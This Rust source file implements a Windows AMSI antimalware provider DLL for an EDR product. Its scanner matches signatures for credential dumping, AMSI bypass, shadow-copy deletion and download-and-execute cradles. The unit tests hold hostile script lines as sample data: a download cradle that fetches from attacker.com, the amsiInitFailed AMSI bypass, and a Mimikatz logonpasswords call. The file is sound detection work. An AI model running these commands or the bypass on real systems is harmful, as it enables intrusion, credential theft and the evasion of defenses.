#![allow(non_snake_case)]

use std::ffi::c_void;
use std::sync::atomic::{AtomicU32, Ordering};
use windows::core::{GUID, HRESULT, PCWSTR};
use windows::Win32::Foundation::{BOOL, CLASS_E_CLASSNOTAVAILABLE, E_FAIL, E_NOINTERFACE, E_POINTER, S_FALSE, S_OK};
use windows::Win32::System::Com::CoTaskMemAlloc;
use windows::Win32::System::Registry::{
    RegCloseKey, RegCreateKeyExW, RegDeleteTreeW, RegSetValueExW, HKEY, HKEY_LOCAL_MACHINE,
    KEY_ALL_ACCESS, REG_OPTION_NON_VOLATILE, REG_SZ,
};

// COM GUIDs
pub const CLSID_INSIEDR_AMSI: GUID = GUID::from_u128(0x4d8b41d8_927a_45c6_a6f7_4a47e53b0b2e);
pub const IID_IUNKNOWN: GUID = GUID::from_u128(0x00000000_0000_0000_c000_000000000046);
pub const IID_ICLASSFACTORY: GUID = GUID::from_u128(0x00000001_0000_0000_c000_000000000046);
pub const IID_IANTIMALWARE_PROVIDER: GUID = GUID::from_u128(0xb2cabfe3_fe04_42ac_a57e_080f4f71cf39);

// AMSI Results
pub const AMSI_RESULT_CLEAN: u32 = 0;
pub const AMSI_RESULT_NOT_DETECTED: u32 = 1;
pub const AMSI_RESULT_DETECTED: u32 = 32768; // 0x8000

// AMSI Attributes
pub const AMSI_ATTRIBUTE_APP_NAME: u32 = 0;
pub const AMSI_ATTRIBUTE_CONTENT_NAME: u32 = 1;
pub const AMSI_ATTRIBUTE_CONTENT_SIZE: u32 = 2;
pub const AMSI_ATTRIBUTE_CONTENT_ADDRESS: u32 = 3;

static ACTIVE_INSTANCES: AtomicU32 = AtomicU32::new(0);

// --- Vtables ---

#[repr(C)]
pub struct IUnknownVtbl {
    pub QueryInterface: unsafe extern "system" fn(this: *mut c_void, riid: *const GUID, ppvObject: *mut *mut c_void) -> HRESULT,
    pub AddRef: unsafe extern "system" fn(this: *mut c_void) -> u32,
    pub Release: unsafe extern "system" fn(this: *mut c_void) -> u32,
}

#[repr(C)]
pub struct IClassFactoryVtbl {
    pub parent: IUnknownVtbl,
    pub CreateInstance: unsafe extern "system" fn(this: *mut c_void, pUnkOuter: *mut c_void, riid: *const GUID, ppvObject: *mut *mut c_void) -> HRESULT,
    pub LockServer: unsafe extern "system" fn(this: *mut c_void, fLock: BOOL) -> HRESULT,
}

#[repr(C)]
pub struct IAntimalwareProviderVtbl {
    pub parent: IUnknownVtbl,
    pub Scan: unsafe extern "system" fn(this: *mut c_void, stream: *mut IAmsiStream, result: *mut u32) -> HRESULT,
    pub CloseSession: unsafe extern "system" fn(this: *mut c_void, session: u64),
    pub DisplayName: unsafe extern "system" fn(this: *mut c_void, displayName: *mut *mut u16) -> HRESULT,
}

#[repr(C)]
pub struct IAmsiStreamVtbl {
    pub parent: IUnknownVtbl,
    pub GetAttribute: unsafe extern "system" fn(this: *mut c_void, attribute: u32, dataSize: u32, data: *mut u8, retData: *mut u32) -> HRESULT,
    pub Read: unsafe extern "system" fn(this: *mut c_void, position: u64, size: u32, buffer: *mut u8, readSize: *mut u32) -> HRESULT,
}

#[repr(C)]
pub struct IAmsiStream {
    pub lpVtbl: *const IAmsiStreamVtbl,
}

// --- COM Objects ---

#[repr(C)]
pub struct InsiAmsiClassFactory {
    pub lpVtbl: *const IClassFactoryVtbl,
    ref_count: AtomicU32,
}

#[repr(C)]
pub struct InsiAntimalwareProvider {
    pub lpVtbl: *const IAntimalwareProviderVtbl,
    ref_count: AtomicU32,
}

static CLASS_FACTORY_VTBL: IClassFactoryVtbl = IClassFactoryVtbl {
    parent: IUnknownVtbl {
        QueryInterface: cf_query_interface,
        AddRef: cf_add_ref,
        Release: cf_release,
    },
    CreateInstance: cf_create_instance,
    LockServer: cf_lock_server,
};

static ANTIMALWARE_PROVIDER_VTBL: IAntimalwareProviderVtbl = IAntimalwareProviderVtbl {
    parent: IUnknownVtbl {
        QueryInterface: prov_query_interface,
        AddRef: prov_add_ref,
        Release: prov_release,
    },
    Scan: prov_scan,
    CloseSession: prov_close_session,
    DisplayName: prov_display_name,
};

// --- Class Factory Implementation ---

unsafe extern "system" fn cf_query_interface(this: *mut c_void, riid: *const GUID, ppvObject: *mut *mut c_void) -> HRESULT {
    if ppvObject.is_null() {
        return E_POINTER;
    }
    *ppvObject = std::ptr::null_mut();

    let guid = *riid;
    if guid == IID_IUNKNOWN || guid == IID_ICLASSFACTORY {
        *ppvObject = this;
        cf_add_ref(this);
        S_OK
    } else {
        E_NOINTERFACE
    }
}

unsafe extern "system" fn cf_add_ref(this: *mut c_void) -> u32 {
    let cf = &*(this as *const InsiAmsiClassFactory);
    cf.ref_count.fetch_add(1, Ordering::SeqCst) + 1
}

unsafe extern "system" fn cf_release(this: *mut c_void) -> u32 {
    let cf = &*(this as *const InsiAmsiClassFactory);
    let count = cf.ref_count.fetch_sub(1, Ordering::SeqCst) - 1;
    if count == 0 {
        let _ = Box::from_raw(this as *mut InsiAmsiClassFactory);
        ACTIVE_INSTANCES.fetch_sub(1, Ordering::SeqCst);
    }
    count
}

unsafe extern "system" fn cf_create_instance(_this: *mut c_void, pUnkOuter: *mut c_void, riid: *const GUID, ppvObject: *mut *mut c_void) -> HRESULT {
    if ppvObject.is_null() {
        return E_POINTER;
    }
    *ppvObject = std::ptr::null_mut();

    if !pUnkOuter.is_null() {
        return CLASS_E_CLASSNOTAVAILABLE;
    }

    let prov = Box::new(InsiAntimalwareProvider {
        lpVtbl: &ANTIMALWARE_PROVIDER_VTBL,
        ref_count: AtomicU32::new(1),
    });

    let raw = Box::into_raw(prov) as *mut c_void;
    let res = prov_query_interface(raw, riid, ppvObject);
    prov_release(raw);
    res
}

unsafe extern "system" fn cf_lock_server(_this: *mut c_void, fLock: BOOL) -> HRESULT {
    if fLock.as_bool() {
        ACTIVE_INSTANCES.fetch_add(1, Ordering::SeqCst);
    } else {
        ACTIVE_INSTANCES.fetch_sub(1, Ordering::SeqCst);
    }
    S_OK
}

// --- Antimalware Provider Implementation ---

unsafe extern "system" fn prov_query_interface(this: *mut c_void, riid: *const GUID, ppvObject: *mut *mut c_void) -> HRESULT {
    if ppvObject.is_null() {
        return E_POINTER;
    }
    *ppvObject = std::ptr::null_mut();

    let guid = *riid;
    if guid == IID_IUNKNOWN || guid == IID_IANTIMALWARE_PROVIDER {
        *ppvObject = this;
        prov_add_ref(this);
        S_OK
    } else {
        E_NOINTERFACE
    }
}

unsafe extern "system" fn prov_add_ref(this: *mut c_void) -> u32 {
    let prov = &*(this as *const InsiAntimalwareProvider);
    prov.ref_count.fetch_add(1, Ordering::SeqCst) + 1
}

unsafe extern "system" fn prov_release(this: *mut c_void) -> u32 {
    let prov = &*(this as *const InsiAntimalwareProvider);
    let count = prov.ref_count.fetch_sub(1, Ordering::SeqCst) - 1;
    if count == 0 {
        let _ = Box::from_raw(this as *mut InsiAntimalwareProvider);
        ACTIVE_INSTANCES.fetch_sub(1, Ordering::SeqCst);
    }
    count
}

unsafe extern "system" fn prov_scan(_this: *mut c_void, stream: *mut IAmsiStream, result: *mut u32) -> HRESULT {
    if stream.is_null() || result.is_null() {
        return E_POINTER;
    }

    *result = AMSI_RESULT_CLEAN;

    let s = &*stream;
    let vtbl = &*s.lpVtbl;

    // 1. Read Content Size
    let mut content_size: u64 = 0;
    let mut ret_data: u32 = 0;
    let hr = (vtbl.GetAttribute)(
        stream as *mut c_void,
        AMSI_ATTRIBUTE_CONTENT_SIZE,
        std::mem::size_of::<u64>() as u32,
        &mut content_size as *mut u64 as *mut u8,
        &mut ret_data,
    );

    if hr.is_err() || content_size == 0 {
        return S_OK;
    }

    // Cap scan buffer at 2MB to ensure high performance
    let read_size = content_size.min(2 * 1024 * 1024) as u32;
    let mut buffer = vec![0u8; read_size as usize];
    let mut bytes_read: u32 = 0;

    let read_hr = (vtbl.Read)(
        stream as *mut c_void,
        0,
        read_size,
        buffer.as_mut_ptr(),
        &mut bytes_read,
    );

    if read_hr.is_err() || bytes_read == 0 {
        return S_OK;
    }

    buffer.truncate(bytes_read as usize);
    // Strip null bytes so both UTF-8 and UTF-16 LE script streams match reliably without evasion
    let content_text = String::from_utf8_lossy(&buffer)
        .to_lowercase()
        .replace('\0', "");

    // Deobfuscate common script evasions: PowerShell backticks, CMD carets, and string concatenation
    let deobfuscated_text = content_text
        .replace('`', "")
        .replace('^', "")
        .replace("'+'", "")
        .replace("\"+\"", "");

    // 2. High-Severity Threat Pattern Matcher
    let mut threat_detected = false;
    let mut threat_reason = "";

    let threat_signatures = [
        ("invoke-mimikatz", "Credential Dumping (Invoke-Mimikatz)"),
        ("sekurlsa::logonpasswords", "LSASS Memory Extraction (Mimikatz Sekurlsa)"),
        ("amsiutils", "AMSI Anti-Tamper / Patching Attempt"),
        ("amsiinitfailed", "AMSI Bypass / Memory Patching"),
        ("[system.reflection.assembly]::load", "Reflective In-Memory Assembly Loading"),
        ("system.runtime.interopservices.marshal::copy", "Native Memory Injection Primitive"),
        ("vssadmin delete shadows", "Ransomware Volume Shadow Copy Deletion"),
        ("wmic shadowcopy delete", "Ransomware Shadow Copy Deletion"),
        ("virtualalloc", "Memory Shellcode Allocation Primitive"),
        ("createremotethread", "Cross-Process Thread Injection"),
    ];

    for (sig, reason) in &threat_signatures {
        if content_text.contains(sig) || deobfuscated_text.contains(sig) {
            threat_detected = true;
            threat_reason = reason;
            break;
        }
    }

    // Secondary Heuristic: Web download + dynamic invocation (IEX / Invoke-Expression)
    if !threat_detected {
        let has_download = deobfuscated_text.contains("downloadstring")
            || deobfuscated_text.contains("downloadfile")
            || deobfuscated_text.contains("iwr ");
        let has_iex = deobfuscated_text.contains("iex ")
            || deobfuscated_text.contains("invoke-expression")
            || deobfuscated_text.contains("iex(");
        if has_download && has_iex {
            threat_detected = true;
            threat_reason = "Dynamic Web Cradle Execution (IEX + WebDownload)";
        }
    }

    if threat_detected {
        *result = AMSI_RESULT_DETECTED;
        notify_service_ipc("AMSI_THREAT_BLOCKED", threat_reason, buffer.len());
    } else {
        *result = AMSI_RESULT_CLEAN;
    }

    S_OK
}

unsafe extern "system" fn prov_close_session(_this: *mut c_void, _session: u64) {}

unsafe extern "system" fn prov_display_name(_this: *mut c_void, displayName: *mut *mut u16) -> HRESULT {
    if displayName.is_null() {
        return E_POINTER;
    }

    let name = "InsiEDR Enterprise AMSI Guard\0";
    let wide: Vec<u16> = name.encode_utf16().collect();
    let size = wide.len() * std::mem::size_of::<u16>();

    let mem = CoTaskMemAlloc(size);
    if mem.is_null() {
        return E_FAIL;
    }

    std::ptr::copy_nonoverlapping(wide.as_ptr(), mem as *mut u16, wide.len());
    *displayName = mem as *mut u16;
    S_OK
}

// --- IPC Notification to InsiEDR Service ---

fn notify_service_ipc(event_type: &str, reason: &str, content_len: usize) {
    use std::fs::OpenOptions;
    use std::io::Write;

    // Stream notification to InsiEDR agent Named Pipe if available
    let payload = serde_json::json!({
        "timestamp": chrono::Utc::now().to_rfc3339(),
        "source": "insiedr-amsi-provider",
        "event": event_type,
        "reason": reason,
        "content_length_bytes": content_len,
        "action": "BLOCKED"
    });

    let message = format!("{}\n", payload);

    // Fast check: only attempt write if pipe is available, preventing host process delay
    unsafe {
        if windows::Win32::System::Pipes::WaitNamedPipeW(windows::core::w!(r"\\.\pipe\InsiEDR-Telemetry-IPC"), 5).as_bool() {
            if let Ok(mut pipe) = OpenOptions::new()
                .write(true)
                .open(r"\\.\pipe\InsiEDR-Telemetry-IPC")
            {
                let _ = pipe.write_all(message.as_bytes());
            }
        }
    }
}

// --- DLL Lifetime & COM Registration ---

static mut DLL_HMODULE: windows::Win32::Foundation::HMODULE = windows::Win32::Foundation::HMODULE(std::ptr::null_mut());

#[no_mangle]
pub unsafe extern "system" fn DllMain(
    hinst: windows::Win32::Foundation::HMODULE,
    reason: u32,
    _reserved: *mut c_void,
) -> BOOL {
    if reason == 1 { // DLL_PROCESS_ATTACH
        DLL_HMODULE = hinst;
    }
    BOOL(1)
}

#[no_mangle]
pub unsafe extern "system" fn DllGetClassObject(
    rclsid: *const GUID,
    riid: *const GUID,
    ppv: *mut *mut c_void,
) -> HRESULT {
    if rclsid.is_null() || riid.is_null() || ppv.is_null() {
        return E_POINTER;
    }
    *ppv = std::ptr::null_mut();

    if *rclsid != CLSID_INSIEDR_AMSI {
        return CLASS_E_CLASSNOTAVAILABLE;
    }

    let factory = Box::new(InsiAmsiClassFactory {
        lpVtbl: &CLASS_FACTORY_VTBL,
        ref_count: AtomicU32::new(1),
    });

    let raw = Box::into_raw(factory) as *mut c_void;
    let res = cf_query_interface(raw, riid, ppv);
    cf_release(raw);
    res
}

#[no_mangle]
pub unsafe extern "system" fn DllCanUnloadNow() -> HRESULT {
    if ACTIVE_INSTANCES.load(Ordering::SeqCst) == 0 {
        S_OK
    } else {
        S_FALSE
    }
}

#[no_mangle]
pub unsafe extern "system" fn DllRegisterServer() -> HRESULT {
    let clsid_str = "{4D8B41D8-927A-45C6-A6F7-4A47E53B0B2E}\0";
    let mut module_path = [0u16; 512];
    
    // Pass captured DLL_HMODULE to obtain the path of insiedr_amsi.dll rather than the host .exe
    let len = windows::Win32::System::LibraryLoader::GetModuleFileNameW(
        DLL_HMODULE,
        &mut module_path,
    );
    if len == 0 {
        return E_FAIL;
    }

    // 1. Register CLSID in InprocServer32
    let clsid_key = format!("SOFTWARE\\Classes\\CLSID\\{}\0", clsid_str.trim_matches('\0'));
    let inproc_key = format!("SOFTWARE\\Classes\\CLSID\\{}\\InprocServer32\0", clsid_str.trim_matches('\0'));
    
    let mut hkey = HKEY::default();
    let clsid_w: Vec<u16> = clsid_key.encode_utf16().collect();
    if RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        PCWSTR(clsid_w.as_ptr()),
        0,
        None,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        None,
        &mut hkey,
        None,
    ).is_err() {
        return E_FAIL;
    }

    let desc = "InsiEDR Antimalware Provider\0";
    let desc_w: Vec<u16> = desc.encode_utf16().collect();
    let _ = RegSetValueExW(
        hkey,
        PCWSTR::null(),
        0,
        REG_SZ,
        Some(std::slice::from_raw_parts(desc_w.as_ptr() as *const u8, desc_w.len() * 2)),
    );
    let _ = RegCloseKey(hkey);

    let inproc_w: Vec<u16> = inproc_key.encode_utf16().collect();
    if RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        PCWSTR(inproc_w.as_ptr()),
        0,
        None,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        None,
        &mut hkey,
        None,
    ).is_ok() {
        let _ = RegSetValueExW(
            hkey,
            PCWSTR::null(),
            0,
            REG_SZ,
            Some(std::slice::from_raw_parts(module_path.as_ptr() as *const u8, len as usize * 2)),
        );
        let threading = "Both\0";
        let thread_w: Vec<u16> = threading.encode_utf16().collect();
        let name_threading = "ThreadingModel\0";
        let name_th_w: Vec<u16> = name_threading.encode_utf16().collect();
        let _ = RegSetValueExW(
            hkey,
            PCWSTR(name_th_w.as_ptr()),
            0,
            REG_SZ,
            Some(std::slice::from_raw_parts(thread_w.as_ptr() as *const u8, thread_w.len() * 2)),
        );
        let _ = RegCloseKey(hkey);
    }

    // 2. Register under AMSI Providers
    let amsi_prov_key = format!("SOFTWARE\\Microsoft\\AMSI\\Providers\\{}\0", clsid_str.trim_matches('\0'));
    let amsi_w: Vec<u16> = amsi_prov_key.encode_utf16().collect();
    if RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        PCWSTR(amsi_w.as_ptr()),
        0,
        None,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        None,
        &mut hkey,
        None,
    ).is_ok() {
        let _ = RegSetValueExW(
            hkey,
            PCWSTR::null(),
            0,
            REG_SZ,
            Some(std::slice::from_raw_parts(desc_w.as_ptr() as *const u8, desc_w.len() * 2)),
        );
        let _ = RegCloseKey(hkey);
    }

    S_OK
}

#[no_mangle]
pub unsafe extern "system" fn DllUnregisterServer() -> HRESULT {
    let clsid_str = "{4D8B41D8-927A-45C6-A6F7-4A47E53B0B2E}\0";
    let clsid_key = format!("SOFTWARE\\Classes\\CLSID\\{}\0", clsid_str.trim_matches('\0'));
    let clsid_w: Vec<u16> = clsid_key.encode_utf16().collect();
    let _ = RegDeleteTreeW(HKEY_LOCAL_MACHINE, PCWSTR(clsid_w.as_ptr()));

    let amsi_prov_key = format!("SOFTWARE\\Microsoft\\AMSI\\Providers\\{}\0", clsid_str.trim_matches('\0'));
    let amsi_w: Vec<u16> = amsi_prov_key.encode_utf16().collect();
    let _ = RegDeleteTreeW(HKEY_LOCAL_MACHINE, PCWSTR(amsi_w.as_ptr()));

    S_OK
}

#[cfg(test)]
mod tests {
    use super::*;

    #[repr(C)]
    struct MockStreamWrapper {
        vtbl: *const IAmsiStreamVtbl,
        content: Vec<u8>,
    }

    static MOCK_STREAM_VTBL: IAmsiStreamVtbl = IAmsiStreamVtbl {
        parent: IUnknownVtbl {
            QueryInterface: mock_qi,
            AddRef: mock_addref,
            Release: mock_release,
        },
        GetAttribute: mock_get_attr,
        Read: mock_read,
    };

    unsafe extern "system" fn mock_qi(_: *mut c_void, _: *const GUID, _: *mut *mut c_void) -> HRESULT {
        S_OK
    }
    unsafe extern "system" fn mock_addref(_: *mut c_void) -> u32 {
        1
    }
    unsafe extern "system" fn mock_release(_: *mut c_void) -> u32 {
        1
    }
    unsafe extern "system" fn mock_get_attr(this: *mut c_void, attr: u32, _: u32, data: *mut u8, ret: *mut u32) -> HRESULT {
        let stream = &*(this as *const MockStreamWrapper);
        if attr == AMSI_ATTRIBUTE_CONTENT_SIZE {
            let size = stream.content.len() as u64;
            std::ptr::copy_nonoverlapping(&size as *const u64 as *const u8, data, 8);
            *ret = 8;
        }
        S_OK
    }
    unsafe extern "system" fn mock_read(this: *mut c_void, pos: u64, size: u32, buf: *mut u8, read: *mut u32) -> HRESULT {
        let stream = &*(this as *const MockStreamWrapper);
        let start = pos as usize;
        let end = (pos as usize + size as usize).min(stream.content.len());
        let to_copy = end.saturating_sub(start);
        if to_copy > 0 {
            std::ptr::copy_nonoverlapping(stream.content[start..end].as_ptr(), buf, to_copy);
        }
        *read = to_copy as u32;
        S_OK
    }

    #[test]
    fn test_amsi_com_lifecycle_and_threat_detection() {
        unsafe {
            // 1. Verify DllGetClassObject returns IClassFactory
            let mut ppv = std::ptr::null_mut();
            let hr = DllGetClassObject(&CLSID_INSIEDR_AMSI, &IID_ICLASSFACTORY, &mut ppv);
            assert_eq!(hr, S_OK);
            assert!(!ppv.is_null());

            // 2. Verify IClassFactory creates IAntimalwareProvider
            let cf = ppv as *mut InsiAmsiClassFactory;
            let mut prov_ppv = std::ptr::null_mut();
            let hr2 = ((*(*cf).lpVtbl).CreateInstance)(ppv, std::ptr::null_mut(), &IID_IANTIMALWARE_PROVIDER, &mut prov_ppv);
            assert_eq!(hr2, S_OK);
            assert!(!prov_ppv.is_null());

            // 3. Test Benign Clean Payload
            let mock_clean = MockStreamWrapper {
                vtbl: &MOCK_STREAM_VTBL,
                content: b"Write-Host 'InsiEDR Enterprise Sensor Initialized'".to_vec(),
            };
            let mut result = 999;
            let scan_hr = prov_scan(prov_ppv, &mock_clean as *const MockStreamWrapper as *mut IAmsiStream, &mut result);
            assert_eq!(scan_hr, S_OK);
            assert_eq!(result, AMSI_RESULT_CLEAN);

            // 4. Test Weaponized Web Cradle Payload (IEX + DownloadString)
            let mock_threat1 = MockStreamWrapper {
                vtbl: &MOCK_STREAM_VTBL,
                content: b"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/beacon.ps1')".to_vec(),
            };
            let mut result1 = 999;
            let threat_hr1 = prov_scan(prov_ppv, &mock_threat1 as *const MockStreamWrapper as *mut IAmsiStream, &mut result1);
            assert_eq!(threat_hr1, S_OK);
            assert_eq!(result1, AMSI_RESULT_DETECTED);

            // 5. Test Credential Dumping Payload (Invoke-Mimikatz)
            let mock_threat2 = MockStreamWrapper {
                vtbl: &MOCK_STREAM_VTBL,
                content: b"function Invoke-Mimikatz { sekurlsa::logonpasswords }".to_vec(),
            };
            let mut result2 = 999;
            let threat_hr2 = prov_scan(prov_ppv, &mock_threat2 as *const MockStreamWrapper as *mut IAmsiStream, &mut result2);
            assert_eq!(threat_hr2, S_OK);
            assert_eq!(result2, AMSI_RESULT_DETECTED);

            // 6. Test AMSI Memory Bypass Patching Attempt
            let mock_threat3 = MockStreamWrapper {
                vtbl: &MOCK_STREAM_VTBL,
                content: b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)".to_vec(),
            };
            let mut result3 = 999;
            let threat_hr3 = prov_scan(prov_ppv, &mock_threat3 as *const MockStreamWrapper as *mut IAmsiStream, &mut result3);
            assert_eq!(threat_hr3, S_OK);
            assert_eq!(result3, AMSI_RESULT_DETECTED);

            // 7. Test Obfuscated UTF-16 LE / Null-Byte Interleaved Evasion
            let utf16_mimikatz = "i\0n\0v\0o\0k\0e\0-\0m\0i\0m\0i\0k\0a\0t\0z\0";
            let mock_threat4 = MockStreamWrapper {
                vtbl: &MOCK_STREAM_VTBL,
                content: utf16_mimikatz.as_bytes().to_vec(),
            };
            let mut result4 = 999;
            let threat_hr4 = prov_scan(prov_ppv, &mock_threat4 as *const MockStreamWrapper as *mut IAmsiStream, &mut result4);
            assert_eq!(threat_hr4, S_OK);
            assert_eq!(result4, AMSI_RESULT_DETECTED);
        }
    }
}


